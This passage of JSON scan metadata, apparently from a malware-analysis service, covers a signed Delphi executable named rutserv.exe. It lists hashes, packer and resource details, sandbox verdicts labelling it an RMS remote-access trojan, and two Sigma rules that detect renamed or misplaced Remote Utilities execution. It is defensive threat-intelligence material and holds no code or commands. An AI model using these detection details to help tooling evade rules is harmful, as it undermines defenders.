      "authentihash": "9e15c24a0e3baf9a665a8b94dd1155faeecad9cac87a7328844bd6ee2c863789",
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "version": "11.0 Alexandria",
            "type": "Compiler",
            "name": "Embarcadero Delphi"
          },
          {
            "info": "GUI32,signed",
            "version": "2.25*,Delphi",
            "type": "Linker",
            "name": "Turbo Linker"
          },
          {
            "info": "PKCS #7",
            "version": "2.0",
            "type": "Sign tool",
            "name": "Windows Authenticode"
          }
        ]
      },
      "last_submission_date": 1705907686,
      "sigma_analysis_results": [
        {
          "rule_title": "Renamed Remote Utilities RAT (RURAT) Execution",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-2169-653B-1B06-000000003B00}",
                "ProcessId": "7364",
                "Product": "Remote Utilities",
                "Description": "Remote Utilities - Host",
                "Company": "Remote Utilities Pty (Cy) Ltd.",
                "ParentProcessGuid": "{C784477D-0415-6539-6A00-000000003B00}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=652C2A693B333504A3879460D0AF7224,SHA256=760E2FD3E57186B597D40B996811768E6C4A28CA54685E029104FCF82F68238D,IMPHASH=43E22B2A2572D166D66AAB5B012901E9",
                "OriginalFileName": "-",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "FileVersion": "7.2.2.0",
                "ParentProcessId": "4996",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "\"C:\\Users\\george\\Desktop\\file.exe\"",
                "EventID": "1",
                "LogonGuid": "C784477D-0415-6539-63DB-030000000000",
                "LogonId": "252771",
                "Image": "C:\\Users\\george\\Desktop\\file.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
                "UtcTime": "1698373993",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects execution of renamed Remote Utilities (RURAT) via Product PE header field",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
          "rule_id": "a7d9d6781e1b1a5c65f3603e5aa6e2da23879bb16ea543f313a3d39f5d7949a8"
        },
        {
          "rule_title": "Remote Access Tool - RURAT Execution From Unusual Location",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-2169-653B-1B06-000000003B00}",
                "ProcessId": "7364",
                "Product": "Remote Utilities",
                "Description": "Remote Utilities - Host",
                "Company": "Remote Utilities Pty (Cy) Ltd.",
                "ParentProcessGuid": "{C784477D-0415-6539-6A00-000000003B00}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=652C2A693B333504A3879460D0AF7224,SHA256=760E2FD3E57186B597D40B996811768E6C4A28CA54685E029104FCF82F68238D,IMPHASH=43E22B2A2572D166D66AAB5B012901E9",
                "OriginalFileName": "-",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "FileVersion": "7.2.2.0",
                "ParentProcessId": "4996",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "\"C:\\Users\\george\\Desktop\\file.exe\"",
                "EventID": "1",
                "LogonGuid": "C784477D-0415-6539-63DB-030000000000",
                "LogonId": "252771",
                "Image": "C:\\Users\\george\\Desktop\\file.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
                "UtcTime": "1698373993",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects execution of Remote Utilities RAT (RURAT) from an unusual location (outside of 'C:\\Program Files')",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
          "rule_id": "afdd67de130ff9c5fd2b18ca53480574ad0613d99edb23555df03caaf3cd774b"
        }
      ],
      "meaningful_name": "rutserv.exe",
      "trid": [
        {
          "file_type": "Inno Setup installer",
          "probability": 39.3
        },
        {
          "file_type": "Windows Control Panel Item (generic)",
          "probability": 21.1
        },
        {
          "file_type": "InstallShield setup",
          "probability": 15.7
        },
        {
          "file_type": "Win32 EXE PECompact compressed (generic)",
          "probability": 15.2
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 3.8
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 0,
          "medium": 2,
          "critical": 0,
          "low": 0
        }
      },
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "malicious",
          "confidence": 56,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "MALWARE",
            "EVADER"
          ],
          "malware_names": [
            "RMSRemoteAdmin"
          ]
        },
        "C2AE": {
          "category": "malicious",
          "confidence": 50,
          "sandbox_name": "C2AE",
          "malware_classification": [
            "RAT"
          ],
          "malware_names": [
            "RMS"
          ]
        }
      },
      "sha256": "760e2fd3e57186b597d40b996811768e6c4a28ca54685e029104fcf82f68238d",
      "type_extension": "exe",
      "tags": [
        "peexe",
        "overlay",
        "bobsoft",
        "signed",
        "detect-debug-environment",
        "idle",
        "checks-user-input"
      ],
      "last_analysis_date": 1706324487,
      "unique_sources": 11,
      "first_submission_date": 1698332394,
      "sha1": "235ba3847df3f39ad445b5b912cb2fb5224d9e59",
      "ssdeep": "196608:Sd9U0CaHFxbNvfkPrWcrKZPYOrnnGdDoFI0wb6AIALUKyL5w2kEdyMZNAxa:Sd9U0HxxUPzoPGUAIALUKy/L",
      "packers": {
        "PEiD": "BobSoft Mini Delphi -> BoB / BobSoft"
      },
      "md5": "652c2a693b333504a3879460d0af7224",
      "pe_info": {
        "exports": [
          "__dbk_fcall_wrapper",
          "dbkFCallWrapperAddr",
          "madTraceProcess"
        ],
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "entropy": 7.93176794052124,
            "chi2": 289.56,
            "filetype": "PNG",
            "sha256": "980348c33f39d36526d1a65403cfd8921a142071ee2a225641b924b74f625c71",
            "type": "DXSKINS"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.705811500549316,
            "chi2": 371.42,
            "filetype": "PNG",
            "sha256": "9e587821b0ab4fea7511ed55163bd0c18cffc68a142a5dc58140ea49162078cd",
            "type": "DXSKINS"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 2.419240713119507,
            "chi2": 1644,
            "filetype": "unknown",
            "sha256": "424641ba086d848ef7746a3bd7180ae0143f858c616ac9e0f0e6294cc6e212db",
            "type": "MAD"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.999792098999023,
            "chi2": 295.52,
            "filetype": "unknown",
            "sha256": "1d8daf96350813991d31968e6a5a8d2e286b17130ae3eb73546daf99befe2b96",
            "type": "MAD"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.806166648864746,
            "chi2": 574.42,
            "filetype": "PNG",
            "sha256": "2327adee2c61d04340b70f14d8640e2c1047ff369ad987e0b56e9ab571ac9294",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.591518878936768,
            "chi2": 681.65,
            "filetype": "PNG",
            "sha256": "285242aaa6527d36556b4aa4b63bef256bb8a193c073d7251e0813d406cc5c94",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.94403600692749,
            "chi2": 376.08,
            "filetype": "PNG",
            "sha256": "76a509a5319f71822a2fb4d9b48cd2ec54953f9f215d8443e2b0ca859d4935ef",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.880000114440918,
            "chi2": 2985.25,
            "filetype": "PNG",
            "sha256": "a51f7c5554bb51f498c5233a9e30a5e3a61f4680a5a40c5685463d58be4c37f6",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.983234405517578,
            "chi2": 997.16,
            "filetype": "PNG",
            "sha256": "21bb072cce226c03472206044965f371311c9698fa5f02bdaf2f4cfe3552ae06",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.8641276359558105,
            "chi2": 2051.45,
            "filetype": "PNG",
            "sha256": "65c236847c24ab92d98fc80bc4a0a0f5dc4309d433966fefba073b51cd71dcf5",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.872692108154297,
            "chi2": 971.79,
            "filetype": "PNG",
            "sha256": "65c2f5ec390fc8a3fa4a7d500a34b79d848449ab02959942c41d6438568a79d3",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.67671537399292,
            "chi2": 686.73,
            "filetype": "PNG",
            "sha256": "d26f7e9502007ad3836c5bc8a82d0bf7e96912679cd408f4621d4205356a5058",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.71905517578125,
            "chi2": 1092.98,
            "filetype": "PNG",
            "sha256": "a7862eb66f4268c7e836b6f1ea314748d2ecbb2177ad4c8e4cd23f465b086087",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 6.208461284637451,
            "chi2": 825.82,
            "filetype": "PNG",
            "sha256": "95daff3ed8d5a6f23371c04fa00186b58168fcb7593b3f85b29a5f0843f83719",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 6.1169939041137695,
            "chi2": 919.87,
            "filetype": "PNG",
            "sha256": "c7fca09fd08cec1231e1f580bfa1c40258e48d46394fdf03e669c67aad5c3510",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.141294956207275,
            "chi2": 486.4,
            "filetype": "PNG",
            "sha256": "f0cb940b18f4092d7d9b8a63fa3feec119e432ad6b211a946ddc09d32a5d2090",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 2.951073169708252,
            "chi2": 30655.41,
            "filetype": "unknown",
            "sha256": "81f3c8b89202a233cc6b5e7b5673bc9e5003361bad791253ef1655834303135c",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 3.0782470703125,
            "chi2": 462790.91,
            "filetype": "unknown",
            "sha256": "a39ea95fd816cd4dff921e628484c60e105272ee1a2c60b4771223ad207d461f",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 3.918152332305908,
            "chi2": 30208.19,
            "filetype": "unknown",
            "sha256": "a641ec93fec1f8e68f922f966ef68e0b0f924b2bec2f443da7a56fb589842ab6",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 2.695143938064575,
            "chi2": 620622.62,
            "filetype": "unknown",
            "sha256": "050a79e9e8d8aaf887e866c867088f6030f2d202bfda9b9f70c3b64b390a4f32",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.505476474761963,
            "chi2": 17876.55,
            "filetype": "unknown",
            "sha256": "6a1f86fdbc67f8be8f1a448c4bf04106a125b5cb8e25a69113125d1a8e319985",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.18770170211792,
            "chi2": 289191.62,
            "filetype": "unknown",
            "sha256": "5243c7683d12d43443152c8bc9c052b159d30681e55b7a43026e901ca33e1715",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 2.414825439453125,
            "chi2": 68475.63,
            "filetype": "unknown",
            "sha256": "3858f4f4f6600db8a6585344f1ca8dab80ecf4c423053192b7a0564f4cd53066",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 2.566753625869751,
            "chi2": 659692,
            "filetype": "unknown",
            "sha256": "6488dc0201011648a5724c0a5b1838bd0a98520e92d50a9bc6cf6478087de742",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 1.1929482221603394,
            "chi2": 117450.62,
            "filetype": "unknown",
            "sha256": "a41ac5bc2b46957943c319ed363a4f0d1f574edcf6252ba2c1f250717306d75e",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 1.974731206893921,
            "chi2": 781844.69,
            "filetype": "unknown",
            "sha256": "6361f44148d2a9277b7023cbc10a71128a4aca300e68dd2b86e2045d21d42a10",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.803817272186279,
            "chi2": 553.86,
            "filetype": "PNG",
            "sha256": "78be2bef61f5a3dd8236809625051bf93fa6eb092edc7a3868d1ceb60cab4a05",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.890903472900391,
            "chi2": 429.21,
            "filetype": "PNG",
            "sha256": "d231cbb691345487ccbc3ae149a3548d12500749b0fc3b9ca6706ef2c12a23b7",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.886739730834961,
            "chi2": 507.6,
            "filetype": "PNG",
            "sha256": "66cef356d95665f2712293c15160e173b215e5c6e64a1f8ed9fa0543c0713ffe",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 6.281675338745117,
            "chi2": 1148.01,
            "filetype": "PNG",
            "sha256": "05baa59e9875fac69e9086ec3fd6b0f8cb015562ec55636153ae133433b801ee",
            "type": "PNG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 6.900649070739746,
            "chi2": 1359.3,
            "filetype": "PNG",
            "sha256": "1450f1c03ec8360c02d65f57f0afa894f55bdbf0cf49b159aa9db00ff16e6c1c",
            "type": "PNG"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 4.635741710662842,
            "chi2": 92543.38,
            "filetype": "SVG",
            "sha256": "ca204b047befe672cb0e463f0f7f09b65861197c06f083d41628ab28206c36a8",
            "type": "RT_RCDATA"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 4.508625030517578,
            "chi2": 65219.39,
            "filetype": "SVG",
            "sha256": "73f3fb038f0b22fcf4514d193d468f1833d2ef4626e4bfa8085721d9b24cff06",
            "type": "RT_RCDATA"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.402189254760742,
            "chi2": 42929.78,
            "filetype": "SVG",
            "sha256": "c8f47186d460886cc858defe33fe58d753c5e3cc73558a129d62dbf59f004c97",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.5465850830078125,
            "chi2": 41171.21,
            "filetype": "SVG",
            "sha256": "6868fbb5b87f0ef04f70ca28ca492c82c51907c02400f818cd29c4705f1b713d",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.78472375869751,
            "chi2": 14802.76,
            "filetype": "SVG",
            "sha256": "ed89950ed623020359fe5771e9185059433a70ea4eb8511264fca97f0b8b6d08",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.4224653244018555,
            "chi2": 35802.17,
            "filetype": "SVG",
            "sha256": "ae390e044d54e5ca14e673118140e6b7eba5dcc36c76fd679f7c736a44d67ebd",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.685492992401123,
            "chi2": 23139.26,
            "filetype": "SVG",
            "sha256": "0770292c3b05161f25a4ec1632b94738ec5142d8381b84b297879307f053955d",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.761166572570801,
            "chi2": 22562.82,
            "filetype": "SVG",
            "sha256": "6190ffa4f1e216ed9d8637f109e7ba2a86d07e5c0e83d344393715a2bc014ffd",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.192305088043213,
            "chi2": 12598.47,
            "filetype": "SVG",
            "sha256": "9682e0b086a3623ac7ce92909e7c68d9f43273ebdb8b8cd46eb9aa57aa8c1c3c",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.280797004699707,
            "chi2": 5187.11,
            "filetype": "SVG",
            "sha256": "915774702e8d1046c3ea6ffc361787b090b2105a52538f04e40b30527418f0b7",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.870663642883301,
            "chi2": 11599.12,
            "filetype": "XML",
            "sha256": "a68854e5a40c4f53742c18adddd14ad0e6bcf9e00287dfcabc7d7e8da808110f",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.914133071899414,
            "chi2": 10822.48,
            "filetype": "XML",
            "sha256": "7c2e849b5ca6f6e80e2ffe11c001af56b76d265b0ee4ac89dfe5a4f4f8a75964",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.977456092834473,
            "chi2": 9821.79,
            "filetype": "XML",
            "sha256": "e4aa6d0e9feb7231ce8a5c7c2a2be00a74449381e653cf4ca67f3148da30df0c",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.507443428039551,
            "chi2": 3990.35,
            "filetype": "XML",
            "sha256": "48fc26989e9196f96126c3dc1c5ba93d542b29835b79c444b7e20ea5c0449e61",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.204372882843018,
            "chi2": 8540.96,
            "filetype": "XML",
            "sha256": "4ff7401caffee927dedb74d292de410d2eea3e55b21edfe20acc643fd25f74aa",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.317980766296387,
            "chi2": 5312.27,
            "filetype": "XML",
            "sha256": "f58497858852cea0e2ed9bbbf689647c5485ad54e81c6a5b3b7c6bca7df7d406",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.470358371734619,
            "chi2": 4862.88,
            "filetype": "XML",
            "sha256": "76efef26737e313706a280e2bd748e39551e488bdaa5d3ba07ccd58a3b8e8df6",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.4638471603393555,
            "chi2": 5572.71,
            "filetype": "XML",
            "sha256": "4848274b390e9f4baa8da7c7c8e8124f7aac40be1a4805f23ef6c839ef4cc6d0",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.302559852600098,
            "chi2": 5238.34,
            "filetype": "XML",
            "sha256": "b23ae762486838fdf40b0e4d85502f285a6bf9942bdafd8324e711c6439d607c",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.441801071166992,
            "chi2": 4978.94,
            "filetype": "XML",
            "sha256": "ed12ea997976b0358b591750b91dc683b4cc79c85df7ba7b5db149b00f911cee",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.129159927368164,
            "chi2": 2200.64,
            "filetype": "XML",
            "sha256": "062e4d4fde58261302b5bd1e7a8444099ecdd2c6a8a94df4d4919d7509c44e8a",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.519864082336426,
            "chi2": 4841.55,
            "filetype": "XML",
            "sha256": "baa65fa281df0a8a2f381aa5dfd08edd029adb0e98b264099b7ade9219fe8f1b",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.199840545654297,
            "chi2": 3828.04,
            "filetype": "XML",
            "sha256": "71ff437eb2f38404b61020a91f080b78f70df6bc3d66a49d9774313242d709f6",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.397949695587158,
            "chi2": 1592.77,
            "filetype": "XML",
            "sha256": "7982a07e027ddfa77ece1550b72f04ebca9b84eedfdadca216e11e6769419e0d",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.280388355255127,
            "chi2": 2964.28,
            "filetype": "XML",
            "sha256": "56106c92600375ddb2f93b049998478939d55ebe23be7e189b6436d0c69dc4a7",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.2810845375061035,
            "chi2": 2969.85,
            "filetype": "XML",
            "sha256": "f2609fff179f932d10851abdcd176cc0b9219ff1e463c2a5a92a3e2d12fbc180",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.483056545257568,
            "chi2": 3892.55,
            "filetype": "XML",
            "sha256": "929274859eaa0ffbf8caaad7dfdbd52873c8d72025045b50da13acc561a3d9aa",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.247783660888672,
            "chi2": 3477.32,
            "filetype": "XML",
            "sha256": "b5c985d20dd5328e591f8e55911358a5db59270c97028b73c3cdfd76e287c945",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.1205244064331055,
            "chi2": 2502.03,
            "filetype": "XML",
            "sha256": "da77c989534f6110ad19d12d76d283f095c1313a9463d6550497b8a3d297bc28",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.223816394805908,
            "chi2": 5077.71,
            "filetype": "XML",
            "sha256": "d63a4a06df64fe632653f2988f5345685420c7192f3aecf80d857eec76579b29",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.113462924957275,
            "chi2": 3692.25,
            "filetype": "XML",
            "sha256": "1a6ff56c028a07b2b1dc2f0c77655e40e75552768b56560efcbc67abe742f8b2",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.319289684295654,
            "chi2": 2107.67,
            "filetype": "XML",
            "sha256": "9284e7bec08fb205c287e94322d0eac062ba9a9508585d0f11fe85d2134712e1",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.169601917266846,
            "chi2": 2626.38,
            "filetype": "XML",
            "sha256": "5b0ffdf4cf8df4477895e1dcc6bfb79e8317181decd2247475c09c4ddcb54ef3",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.292529106140137,
            "chi2": 3200.57,
            "filetype": "XML",
            "sha256": "eccacb5e26201b5686109a3e96949dcddd110c32eff972ff0a2dd201d08b5f11",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.266748428344727,
            "chi2": 5396.49,
            "filetype": "unknown",
            "sha256": "824b912a13936a1da5cc71c43c5904fe31a1c733899201f1fb8c1d10f7567190",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.996192932128906,
            "chi2": 4626.83,
            "filetype": "XML",
            "sha256": "63a1e93e997a9af6af51c3b14014d1941e1fc48a99baf871d0fdc9b6078ae247",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.490472316741943,
            "chi2": 3854.21,
            "filetype": "XML",
            "sha256": "5de7e4891a60a787f97955574f44c7b47aa0c8bafd8aa366b94e95186759997a",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.232542991638184,
            "chi2": 3752.52,
            "filetype": "unknown",
            "sha256": "dbdea04ce2eab7949adfd65dba9b00323645c4ea81e34cfe189e32e0139db83e",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.850241184234619,
            "chi2": 8856.82,
            "filetype": "unknown",
            "sha256": "8fe8930601eeb43ebebb53b483d9fdd76e91c6fa5a8a38b61802463d962c7a76",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.163608074188232,
            "chi2": 5817.69,
            "filetype": "XML",
            "sha256": "7b11e073a865ff9d6f924c06aa34bab7ac44b96448601aac11c17ba4b1416cda",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.4755706787109375,
            "chi2": 3732.99,
            "filetype": "XML",
            "sha256": "09ec651f0906bd4bddd476ca0dcc3533d5273d01ff43796373d5b256bb956467",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.312467098236084,
            "chi2": 7200.92,
            "filetype": "XML",
            "sha256": "1b0406ee3cb28d242ac5d1a994bf92ccc094b736a0eb365bca0854f0ba3b86b8",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.503353595733643,
            "chi2": 4226.15,
            "filetype": "XML",
            "sha256": "ee5ade0dbb621b32a2f926296e29d344cf013ace884731bdc5a56b6a67653d66",
            "type": "SVG"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 4.577019691467285,
            "chi2": 1641093.5,
            "filetype": "unknown",
            "sha256": "98d5f39f9afb3308ec44044b41368118c94de7a14017e7dac748dc07dd00a235",
            "type": "UNICODEDATA"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 6.01643180847168,
            "chi2": 833341.5,
            "filetype": "unknown",
            "sha256": "1beee178dc8c8692881d3b5943c50171debfc98da114a8bb990e0456487a23c9",
            "type": "UNICODEDATA"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.850968837738037,
            "chi2": 41766.47,
            "filetype": "unknown",
            "sha256": "2114a3459d406fb8c1229899bdf4ab4cc4a1230ade606f808d1ca5df09f0d98e",
            "type": "UNICODEDATA"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.141329765319824,
            "chi2": 1435460.12,
            "filetype": "unknown",
            "sha256": "7b10648126eff6d93a35cdb9137d91e3b9cef8ffababbfd8119f13f98f9ac6f4",
            "type": "UNICODEDATA"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.259660243988037,
            "chi2": 1677746.38,
            "filetype": "unknown",
            "sha256": "a3b959df3477ce9da54c9e5939b326b1ad51ec30dc37f62c338ffbc7fb06f033",
            "type": "UNICODEDATA"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 5.727248191833496,
            "chi2": 149804.91,
            "filetype": "unknown",
            "sha256": "0e1b277c6e81078a6040d93ef2557d8b6d7f6b414264773442b1f8b500670a8c",
            "type": "UNICODEDATA"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 2.616791248321533,
            "chi2": 23561.51,
            "filetype": "unknown",
            "sha256": "30df4ddb7d7ff020b05c161b16bafa7002c89871d8b05d132b9c06af0a21b693",
            "type": "RT_CURSOR"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 2.8023130893707275,
            "chi2": 23204.11,
            "filetype": "unknown",
            "sha256": "ce19ace18e87b572e6912306776226af5b8e63959c61cde70a8ff05b3bbdcc41",
            "type": "RT_CURSOR"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.000459671020508,
            "chi2": 19787.99,
            "filetype": "unknown",
            "sha256": "ee1c9c194199c320c893b367602ccc7ee7270bd4395d029f727e097634f47f8c",
            "type": "RT_CURSOR"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 2.563183546066284,
            "chi2": 23586.44,
            "filetype": "unknown",
            "sha256": "9d9edf87ca203ecc60b246cc783d54218dd0ce77d3a025d0bafc580995a4abd8",
            "type": "RT_CURSOR"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 2.6949045658111572,
            "chi2": 22751.94,
            "filetype": "unknown",
            "sha256": "99676c52310db365580965ea646ece86c62951bfd97ec0aae9f738a202a90593",
            "type": "RT_CURSOR"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 2.625270366668701,
            "chi2": 23076.11,
            "filetype": "unknown",
            "sha256": "11726dcf1eebe23a1df5eb0ee2af39196b702eddd69083d646e4475335130b28",
            "type": "RT_CURSOR"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 2.9160430431365967,
            "chi2": 22065.4,
            "filetype": "unknown",
            "sha256": "6f938aab0a03120de4ef8b27aff6ba5146226c92a056a6f04e5ec8d513ce5f9d",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 0.5764527916908264,
            "chi2": 3560855.25,
            "filetype": "unknown",
            "sha256": "5f807e928e2687ddd448a04e9d3f5d274abca5f7092a41de76d935ee7b321c50",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 0.6893264651298523,
            "chi2": 3208505.5,
            "filetype": "unknown",
            "sha256": "17003f70ea108ef5be340a25a96434766dd96fb0f40fa032b44134fe64a62910",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 0.47624608874320984,
            "chi2": 3708094,
            "filetype": "unknown",
            "sha256": "27848f3978c59e278f593a64e197b0d0acc3b27deaf10d57df7b1e3a24aa899b",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 0.4548954665660858,
            "chi2": 3648213.25,
            "filetype": "unknown",
            "sha256": "a1d1aa7d973d13208b45362551cffb7f02f8a6349367f465a28c28657e581df9",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 0.7331784963607788,
            "chi2": 3097002,
            "filetype": "unknown",
            "sha256": "8dd4223e8462c6faca39f91709c447f9e4c6faae5e917a7724caa44874db54a1",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 0.8361490964889526,
            "chi2": 2918183.75,
            "filetype": "unknown",
            "sha256": "e922efe337c1867c985e00e7a04f3076608801c11bf3b0daf654020e6baf922e",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 0.7874153256416321,
            "chi2": 2900552.75,
            "filetype": "unknown",
            "sha256": "3d6fb3ec7735f5db6cbec9722add53d44875b6ea60ff92bd3f3cc2e5327c4a00",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 0.4706704020500183,
            "chi2": 3640934.5,
            "filetype": "unknown",
            "sha256": "0138a09cc399fffb7791c1cbfd7a180157ebbb53a93d5611b9eea1aa9640457e",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 0.6978775858879089,
            "chi2": 3106598,
            "filetype": "unknown",
            "sha256": "99974df312519462fb61bea04c957796fd00916c9ee58c52b2c270706ce22d41",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 0.902945339679718,
            "chi2": 2634215.75,
            "filetype": "unknown",
            "sha256": "13960fdeba768d3d951386661e51bdb6b4d5202de2ce5a3d345acc7abc95ff4e",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 2.714186191558838,
            "chi2": 519880.38,
            "filetype": "unknown",
            "sha256": "50368048b7a53f1734376cd77b4127311699eb76c5115fa52815b57fc2e932e6",
